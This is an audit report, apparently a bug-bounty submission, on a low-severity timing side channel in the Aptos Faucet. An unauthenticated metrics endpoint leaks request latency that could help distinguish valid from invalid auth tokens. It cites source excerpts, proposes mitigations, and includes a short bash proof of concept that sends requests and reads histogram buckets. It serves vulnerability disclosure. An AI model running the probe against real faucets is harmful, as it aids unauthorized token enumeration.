# Audit Report

## Title
Timing Side-Channel Information Disclosure via Unauthenticated Metrics Endpoint in Aptos Faucet

## Summary
The Aptos Faucet exposes precise request timing information through an unauthenticated Prometheus metrics endpoint, allowing attackers to infer which validation checks passed or failed by correlating request timing patterns with histogram bucket distributions.

## Finding Description

The `middleware_log()` function measures precise elapsed time for all faucet requests and publishes this data to Prometheus metrics that are exposed via an unauthenticated endpoint. [1](#0-0) [2](#0-1) [3](#0-2) 

The timing data is published to histogram metrics that track latency by HTTP method, operation ID, and response status: [4](#0-3) 

These metrics are exposed via an unauthenticated endpoint that listens on `0.0.0.0:9101` by default with no access controls: [5](#0-4) [6](#0-5) 

Different validation paths have significantly different execution times. For example, the `AuthTokenChecker` performs fast in-memory lookups, while the `CaptchaChecker` makes external HTTP requests to Google's API: [7](#0-6) [8](#0-7) 

Additionally, when `return_rejections_early` is enabled, checker execution stops at the first rejection, creating distinct timing patterns: [9](#0-8) 

**Attack Scenario:**
1. Attacker sends request with invalid auth token → Fast rejection (~10ms)
2. Attacker queries `/metrics` on port 9101 → Observes histogram bucket in 0-25ms range
3. Attacker sends request with valid auth token but no captcha → Slower rejection (~200ms due to external API call)
4. Attacker queries `/metrics` again → Observes histogram bucket in 100-250ms range
5. Attacker infers the first token was invalid (fast rejection) and second was valid (progressed to captcha check)

## Impact Explanation

This vulnerability falls under **Low Severity** per the Aptos bug bounty program: "Minor information leaks" (up to $1,000). The information disclosed is which validation check failed, not sensitive cryptographic material or financial data. However, this information could aid in:

- **Auth token enumeration**: Attackers can distinguish valid from invalid auth tokens
- **Validation flow mapping**: Understanding the faucet's security architecture
- **Targeted attacks**: Crafting more sophisticated attacks based on observed validation paths

The vulnerability does NOT directly enable:
- Theft or minting of funds
- Consensus violations
- State corruption
- Validator node compromise

## Likelihood Explanation

**High likelihood** - The attack is trivially executable:
- No authentication required for metrics endpoint
- Default configuration exposes endpoint on `0.0.0.0`
- Prometheus histogram resolution (default buckets) provides sufficient granularity
- Attack requires only HTTP requests with no special tools

## Recommendation

Implement one or more of the following mitigations:

1. **Restrict metrics endpoint access** - Bind to localhost only or require authentication
2. **Reduce timing precision** - Use constant-time validation or add random delays
3. **Remove timing from public metrics** - Expose timing metrics only to authenticated monitoring systems
4. **Disable early rejection** - Always run all validators to normalize timing

Example configuration fix:
```rust
// In MetricsServerConfig::default_listen_address()
fn default_listen_address() -> String {
    "127.0.0.1".to_string()  // Changed from "0.0.0.0"
}
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: Timing side-channel attack on Aptos Faucet

FAUCET_URL="http://faucet.example.com:8080"
METRICS_URL="http://faucet.example.com:9101/metrics"

# Step 1: Send request with invalid token
echo "Testing invalid token..."
curl -X POST "$FAUCET_URL/fund" \
  -H "Authorization: Bearer invalid_token_xyz" \
  -H "Content-Type: application/json" \
  -d '{"address":"0x1"}' &

sleep 0.5

# Step 2: Query metrics and observe timing
echo "Checking metrics for invalid token timing..."
curl "$METRICS_URL" | grep "aptos_tap_requests_bucket" | grep "fund" | grep "403"

# Step 3: Send request with valid token (no captcha)
echo "Testing valid token without captcha..."
curl -X POST "$FAUCET_URL/fund" \
  -H "Authorization: Bearer valid_token_abc" \
  -H "Content-Type: application/json" \
  -d '{"address":"0x1"}' &

sleep 0.5

# Step 4: Query metrics again
echo "Checking metrics for valid token timing..."
curl "$METRICS_URL" | grep "aptos_tap_requests_bucket" | grep "fund" | grep "403"

# Compare histogram buckets to infer which validation checks were executed
```

## Notes

While this is classified as Low severity information disclosure, it exemplifies a broader principle: **security-critical services should not expose unauthenticated operational metrics** that reveal internal processing paths. The timing differences between validation paths are inherent to the checker design (external API calls vs. in-memory lookups), making this difficult to fully mitigate without architectural changes or access controls on the metrics endpoint.

### Citations

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L23-23)
```rust
    let start = std::time::Instant::now();
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L52-52)
```rust
    let elapsed = start.elapsed();
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L59-63)
```rust
    drop_logger.attach_response_log(HttpResponseLog {
        response_status,
        operation_id,
        elapsed,
    });
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L128-139)
```rust
                RESPONSE_STATUS
                    .with_label_values(&[response_log.response_status.to_string().as_str()])
                    .observe(response_log.elapsed.as_secs_f64());

                // Log response status per-endpoint + method.
                HISTOGRAM
                    .with_label_values(&[
                        self.request_log.method.as_str(),
                        response_log.operation_id,
                        response_log.response_status.to_string().as_str(),
                    ])
                    .observe(response_log.elapsed.as_secs_f64());
```

**File:** crates/aptos-faucet/metrics-server/src/config.rs (L26-31)
```rust
    fn default_listen_address() -> String {
        "0.0.0.0".to_string()
    }

    fn default_listen_port() -> u16 {
        9101
```

**File:** crates/aptos-faucet/metrics-server/src/server.rs (L26-29)
```rust
#[handler]
fn metrics() -> Vec<u8> {
    encode_metrics(TextEncoder)
}
```

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L42-64)
```rust
        let auth_token = match data
            .headers
            .get(AUTHORIZATION)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.split_whitespace().nth(1))
        {
            Some(auth_token) => auth_token,
            None => return Ok(vec![RejectionReason::new(
                "Either the Authorization header is missing or it is not in the form of 'Bearer <token>'".to_string(),
                RejectionReasonCode::AuthTokenInvalid,
            )]),
        };
        if self.manager.contains(auth_token) {
            Ok(vec![])
        } else {
            Ok(vec![RejectionReason::new(
                format!(
                    "The given auth token is not allowed by the server: {}",
                    auth_token
                ),
                RejectionReasonCode::AuthTokenInvalid,
            )])
        }
```

**File:** crates/aptos-faucet/core/src/checkers/google_captcha.rs (L77-87)
```rust
        let verify_result = reqwest::Client::new()
            .post(GOOGLE_CAPTCHA_ENDPOINT)
            // Google captcha API only accepts form encoded payload, lol
            .form::<VerifyRequest>(&VerifyRequest {
                secret: self.config.google_captcha_api_key.0.clone(),
                response: captcha_token.to_string(),
                remoteip: data.source_ip.to_string(),
            })
            .send()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError))?;
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L263-270)
```rust
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```
